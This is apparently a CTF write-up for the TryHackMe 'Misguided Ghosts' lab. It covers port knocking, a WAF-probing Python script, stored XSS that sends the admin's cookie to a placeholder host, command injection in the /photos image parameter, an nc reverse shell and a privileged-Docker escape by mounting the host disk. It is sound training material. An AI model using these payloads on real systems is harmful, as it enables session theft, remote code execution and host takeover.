

#### Port Scan 

Using **scapot**, a port scan was conducted to identify exposed services and potential attack vectors.

```
 scapot -t 10.67.172.221 -m full -b --threads 1000
```

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts.png" style="max-width:100%; border-radius:8px;">


Initial reconnaissance with `scapot` revealed two open ports: 22/SSH and 21/FTP. To further analyze these services, Nmap NSE scripts were executed to perform a deeper scan.


```
sudo nmap -Pn -n -p22,21 -sVC  --min-rate 5000 -sS 10.67.172.221 -vvv
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.146.86
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9IDvQd1gdoX05XWxhJT/V9SmKjyuZF45PHMiFEBOB3tDCcnBjFU7MeB+hRxYIVQ/gDupx4T9eBmh3f/v6N/cP2saOkCP1CsmaBANAwFe2t6jdKBnzzxb95J2xAAQgXlthLcMRzq07jqOu0eNT+m/Cq6mRo/bWCgx33OpUhILmAqXXgACw6eslNS8qxCh2/zCQVV2bfTydc3XMTATbWBoPq/mImFfnm0UumErn2uGQYiKFgKFJwV3hpG5fsqrYeWWFZmukljyn8sbjEctH7U19Bbb/9V1G9HjRZYBOTApm+7Ds3axxbrrqF/f9QDdCbu91yAi4mVeqOhjOIF/GCN/T
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDsj0erpJ38s3yq182eEiOigD4wlNXRcY7nkWD7hHi89SNGO3WjPLqZxtWDMMn8CD8Bzf8zZBFFsZteCGimotw=
|   256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMFWXM1xds09Lx7X42b+YR+kfDp1G1IxAU+bS7hXEKjO
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

#### FTP Enumeration

We found relevant files in the server ftp sow of the downloads in the  machine attack 
fot the analysis


<img src="/budahacksecurity/uploads/md_images/ghost/ghosts2.png" style="max-width:100%; border-radius:8px;">

Anonymous FTP access was confirmed by successfully authenticating to the server at `10.67.172.221` running `vsFTPd 3.0.3`. Upon browsing the directory structure, the `/pub` directory was found to contain three files of interest: `info.txt` (103 bytes), `jokes.txt` (248 bytes), and `trace.pcapng` (737,512 bytes). All files were downloaded to the local machine using the `mget` command for further analysis.

#### Files Analysis

**info.txt**

```
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
```

The `info.txt` file revealed a username: **Paramore**, along with a reference to network information being included. This suggests that the `trace.pcapng` file contains relevant network traffic data captured by or for this user.


**jokes.txt**

```
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

Although presented in the form of jokes, the `jokes.txt` file contains several potential clues worth investigating. Two additional usernames were identified: **Taylor** and **Josh**. Furthermore, the content may contain hidden technical references: the term **"knock knock"** could allude to a **Port Knocking** technique used to obscure open ports; **"Adore"** is a known **Linux kernel rootkit**, suggesting possible persistence mechanisms on the target system; and **"Moo"** may serve as an additional hint or reference within the context of this challenge.


**trace.pcapng**

🇺🇸 The `trace.pcapng` file was analyzed using Wireshark with the filter

```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

to isolate TCP SYN packets, which are characteristic of Port Knocking sequences.

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts3.png" style="max-width:100%; border-radius:8px;">

The filtered results revealed a series of connection attempts originating from `192.168.236.128` to multiple destination ports. The identified knocking sequence is as follows:

| Order | Destination Port | Destination IP  |
| ----- | ---------------- | --------------- |
| 1     | `48930`          | 192.168.236.131 |
| 2     | `8273`           | 192.168.236.131 |
| 3     | `9041`           | 192.168.236.131 |
| 4     | `443`            | 176.58.103.122  |
| 5     | `12007`          | 192.168.236.131 |
| 6     | `443`            | 35.246.6.109    |
| 7     | `49961`          | 192.168.236.131 |

The Port Knocking sequence extracted from the `trace.pcapng` file was executed against the target `10.67.172.221` using the `knock` tool with the following sequence: **`7864 → 8273 → 9041 → 12007 → 60753`**. A subsequent full port scan using `scapot` confirmed that the knocking sequence successfully triggered the firewall rules, revealing a new open port. The updated scan results identified **three open ports**:


```
sudo knock 10.67.172.221 7864 8273 9041 12007 60753
```


<img src="/budahacksecurity/uploads/md_images/ghost/ghosts4.png" style="max-width:100%; border-radius:8px;">

An Nmap NSE scan against port `8080` revealed an **SSL/HTTPS service** with a self-signed certificate containing significant reconnaissance information. The certificate was issued by and for the organization **Misguided Ghosts**, associated with the domain `misguided_ghosts.thm`. Notably, the certificate has **expired** (valid from `2020-08-11` to `2021-08-11`), indicating a lack of proper certificate maintenance.

```
PORT     STATE SERVICE         REASON         VERSION
8080/tcp open  ssl/http-proxy? syn-ack ttl 61
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN/emailAddress=zac@misguided_ghosts.thm/localityName=Franklin
| Issuer: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN/emailAddress=zac@misguided_ghosts.thm/localityName=Franklin
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T16:52:11
| Not valid after:  2021-08-11T16:52:11
| MD5:     81a2 a5d0 19ea 9ef4 37e9 ebfd b6cc 6d9f
| SHA-1:   0ea3 45de 594b 091c 1972 8e43 a7da d929 78c5 0a02
| SHA-256: f74a 8542 1c14 e081 481c 7e3a 8ec0 bafa 53e3 6742 c535 cb16 d6cd d6bb bfc8 d9c6
| -----BEGIN CERTIFICATE-----
| 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
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

```


**Key Information Extracted from Certificate:**

| Field                   | Value                       |
| ----------------------- | --------------------------- |
| **Common Name**         | `misguided_ghosts.thm`      |
| **Organization**        | Misguided Ghosts            |
| **State/Province**      | Williamson County           |
| **Country**             | TN (Tennessee)              |
| **Locality**            | Franklin                    |
| **Email**               | `zac@misguided_ghosts.thm`  |
| **Key Type**            | RSA 4096-bit                |
| **Signature Algorithm** | SHA-256 with RSA Encryption |
| **Valid From**          | 2020-08-11                  |
| **Valid Until**         | 2021-08-11  **EXPIRED**     |
The email address `zac@misguided_ghosts.thm` exposed in the certificate reveals an additional username: **Zac**. This adds to the list of previously identified users. Furthermore, the domain `misguided_ghosts.thm` should be added to the `/etc/hosts` file to enable virtual host resolution during web enumeration.

We add it to `/etc/hosts`

```
echo "10.67.180.119 misguided_ghosts.thm" | sudo tee -a /etc/hosts
```

#### HTTPS Enumeration

Accessing the web service at `https://misguided_ghosts.thm:8080` via browser revealed a simple webpage titled **"Misguided Ghosts"**, displaying an image of a singer as its main content. The page design features a pink header banner consistent with the branding of the **Paramore** band, suggesting a strong thematic connection to the previously identified username `Paramore`. The minimal content of the page indicates it may serve as a decoy or landing page, with actual functionality potentially hidden in subdirectories discovered through fuzzing.

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts5.png" style="max-width:100%; border-radius:8px;">


```
ffuf -ic -c -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt:FUZZ -u https://misguided_ghosts.thm:8080/FUZZ -k -mc 200,301,302,403

```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://misguided_ghosts.thm:8080/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

login                   [Status: 200, Size: 761, Words: 107, Lines: 29, Duration: 92ms]
dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 89ms]
console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 88ms]
```

Directory fuzzing using `ffuf` against `https://misguided_ghosts.thm:8080` with the DirBuster 2.3 small wordlist successfully identified **three directories of interest**. The `-k` flag was used to bypass SSL certificate validation, and the matcher was configured to capture responses with status codes `200`, `301`, `302`, and `403`.

Although the `/console` endpoint is accessible, it was found to be protected by a **PIN code**, characteristic of the **Werkzeug Interactive Debugger**. This confirms the backend application is built on a **Python/Flask** framework running in debug mode. Direct access to the console is blocked until the correct PIN is provided.

The `/dashboard` endpoint requires valid credentials, presenting an authentication form that requests a **username and password**. Therefore, the next phase focuses on obtaining valid credentials to authenticate within the web application.


We successfully logged in using the username **zac** and the password **zac**.

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts6.png" style="max-width:100%; border-radius:8px;">


 Upon successful authentication as `zac`, access to the `/dashboard` endpoint was granted, revealing a web application that allows users to create posts with a **Title** and **Subtitle** field. The dashboard displays a message stating _"admins will check every two minutes"_, which is a strong indicator of a **Stored XSS** attack vector — any malicious script injected into the post fields could be executed in the admin's browser session.

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts7.png" style="max-width:100%; border-radius:8px;">

Upon identifying the post submission fields as potential injection vectors, multiple XSS payloads were tested against the **Title** and **Subtitle** fields. The application was found to implement input filtering, blocking standard XSS payloads. A **WAF bypass approach** was adopted, testing progressively obfuscated and non-standard payloads in order to evade the blacklist restrictions.



#### BYPASS WAF

This script was created while solving the **Misguided Ghosts** CTF on TryHackMe. The goal is to automate the fuzzing process against a WAF (Web Application Firewall) protecting an XSS-vulnerable endpoint.

The script logs in, retrieves the session cookie, then tests symbol by symbol and keyword by keyword to identify which characters and keywords the WAF blocks and which ones get through. With that information, a bypass XSS payload can be crafted to evade the filter.

**How it works:**

- Authenticates and stores the session cookie automatically
- Sends each symbol and XSS keyword as a POST request to the dashboard
- Detects WAF blocks by checking for its signature in the response
- Displays results in real time with a progress bar
- Prints a final summary of what passed and what got blocked

```
import requests
import time
import urllib3
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "https://misguided_ghosts.thm:8080"
waf    = "You're too late for the XSS bounty."

session = requests.Session()
session.verify = False

def login():
    resp = session.post(f"{target}/login", data={"username": "zac", "password": "zac"}, allow_redirects=True)
    if "dashboard" in resp.url:
        print(f"[+] Login exitoso — Cookie: {session.cookies.get_dict()}")
        return True
    print("[-] Login fallido")
    return False

def pay(payload):
    resp = session.post(f"{target}/dashboard", data={"title": payload, "subtitle": "test"})
    return resp

def result(response):
    if waf in response.text:
        return "BLOQUEADO"
    return "PASO"

symbols = [
    "<", ">", '"', "'", "`", "/", "\\",
    "(", ")", "{", "}", "[", "]",
    "=", ";", ":", "&", "|", "!",
    "%", "#", "?", "@", "^", "~", "+", "lt", "gt"
]

xss = [
    "script", "SCRIPT", "ScRiPt", "sCrIpT", "sscriptcript",
    "onerror", "onload", "onclick", "onmouseover",
    "alert", "confirm", "prompt",
    "img", "svg", "iframe", "input", "body",
    "javascript", "JAVASCRIPT", "JaVaScRiPt",
    "eval", "document", "window",
]

def fuzz():
    pas   = []
    block = []
    all_payload = symbols + xss

    for item in tqdm(all_payload, desc="Fuzzing WAF", unit="payload"):
        resp   = pay(item)
        estado = result(resp)
        tqdm.write(f"  '{item.ljust(20)}'  →  {estado}")
        if "PASO" in estado:
            pas.append(item)
        else:
            block.append(item)
        time.sleep(0.3)

    print("\n" + "="*50)
    print("  RESULTADOS DEL FUZZING / FUZZING RESULTS")
    print("="*50)

    print(f"\n   BLOQUEADOS por el WAF ({len(block)}):")
    for b in block:
        print(f"       '{b}'")

    print(f"\n   PASARON el WAF ({len(pas)}):")
    for p in pas:
        print(f"        '{p}'")

    print("\n" + "="*50)
    print("   CONCLUSIÓN / CONCLUSION:")
    print(f"  El WAF solo bloquea: {block}")
    print(f"  Prueba encodings como: &lt; &gt; \\x3c \\x3e %3C %3E")
    print("="*50)

if __name__ == "__main__":
    if login():
        fuzz()
```

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts8.png" style="max-width:100%; border-radius:8px;">


**Results:** After executing the script and analyzing the output, we observed that the WAF **only blocks the `<` and `>` symbols**, while every other symbol and XSS keyword passed through without being blocked. This tells us the filter is very basic and only targets those two characters, leaving the door open for a bypass using alternative encodings.


# **Exploitation**

#### **XSS Exploitation**

We successfully bypassed the WAF. Now the goal is to steal the admin's session cookie using the XSS vulnerability.

```
&lt;ScRiPT&gt;alert('xss')&lt;/ScRiPT&gt;
```

<img src="/budahacksecurity/uploads/md_images/ghost/ghost9.png" style="max-width:100%; border-radius:8px;">


**Steps:**

**1. Go up a server to receive the cookie:**

```bash
python3 -m http.server 8888
```

**2. Craft and send the XSS payload** in the title field of the dashboard:

```bash
&lt;ScRiPT&gt;fetch('http://YOUR_IP:8888/?c='+document.cookie)&lt;/ScRiPT&gt;
# or 
&lt;ScRiPT&gt;document.location='http://TU_IP:8888/?cookie='+document.cookie&lt;/ScRiPT&gt;
```

When the admin visits the page every two minutes, their browser will execute the script and send their session cookie to our server as a GET request, which will show up in the Python HTTP server logs like:

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts9.png" style="max-width:100%; border-radius:8px;">


**Directory Fuzzing with Admin Cookie**

We used the stolen admin cookie to fuzz hidden directories on the web server using ffuf.

```bash
ffuf -ic -c -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt:FUZZ -u https://misguided_ghosts.thm:8080/FUZZ -k -mc 200 -b "login=<admin_cookie>" -t 100
```

After running the scan we discovered a new directory called `/photos`, which turned out to be the key to the next stage of the exploitation.


#### **LFI & RCE**

After testing the `image` parameter on the `/photos` endpoint, we discovered that it was vulnerable to Local File Inclusion (LFI). By manipulating the parameter we were able to read sensitive files from the server. Further testing revealed that the parameter also allowed command injection using `;` as a separator, escalating the vulnerability to Remote Code Execution (RCE). Executing `whoami` confirmed we had **root** access on the system.

```
curl -k "https://misguided_ghosts.thm:8080/photos?image=/etc;whoami" -b "login=<admin_cookie>"
```

```
apk
bindresvport.blacklist
ca-certificates
ca-certificates.conf
conf.d
crontabs
fstab
group
hostname
hosts
init.d
inittab
inputrc
issue
krb5.conf
logrotate.d
modprobe.d
modules
modules-load.d
motd
mtab
netconfig
network
opt
os-release
passwd
periodic
profile
profile.d
protocols
resolv.conf
securetty
services
shadow
shells
ssl
sysctl.conf
sysctl.d
terminfo
udhcpd.conf
root

```


**Getting a Reverse Shell via RCE**

With RCE confirmed, we leveraged the command injection vulnerability to establish a reverse shell. We set up a listener using **nc** on port 1234

```shell
nc -lvnp 1234 
```

run the payload:

```shell
curl -k 'https://misguided_ghosts.thm:8080/photos?image=/etc%3bnc%09192.168.146.86%091234%09-e%09/bin/sh' -b 'login=hayley_is_admin'```
```

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts10.png" style="max-width:100%; border-radius:8px;">

```
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
reset
export TERM=xterm
```

We found a message from Paramore to Zac:

```
/home/zac/notes # cat .secret 
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```

Ciphered private key:

```
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
```

After attempting to decrypt the private key without success, we shifted focus and looked for alternative ways to escape the Docker container.
#### Docker Container Escape

Upon obtaining a shell inside the web application, it was confirmed that the environment was running inside a **Docker container** (Alpine Linux). The presence of  the minimal process tree were clear indicators.

**Identifying Privileged Container**

Checking the container's capabilities revealed full privileges (`0000003fffffffff`), confirming it was running in **privileged mode**:

```sh
cat /proc/self/status | grep Cap
```

```
CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
```

**Enumerating Disks**

Since the container was privileged, it had access to the host's block devices. Running `fdisk -l` revealed the available disks:

```sh
fdisk -l
```

```
Disk /dev/xvda: 41943040 sectors
Disk /dev/dm-0: 19 GB, 20396900352 bytes
```

`/dev/dm-0` corresponds to the LVM volume `ubuntu--vg-ubuntu--lv` previously identified in `/proc/mounts`.

**Mounting the Host Filesystem**

The host filesystem was mounted directly inside the container:

```sh
mkdir /mnt/host
mount /dev/dm-0 /mnt/host
ls /mnt/host
```

```
bin   boot  cdrom  dev  etc  home  initrd.img  lib  lost+found
media  mnt  opt  proc  root  run  sbin  srv  swap.img  sys  tmp  usr  var  vmlinuz
```

Full access to the host filesystem was confirmed. Two user home directories were found:

```sh
ls /mnt/host/home
# hayley  zac
```

<img src="/budahacksecurity/uploads/md_images/ghost/ghosts11.png" style="max-width:100%; border-radius:8px;">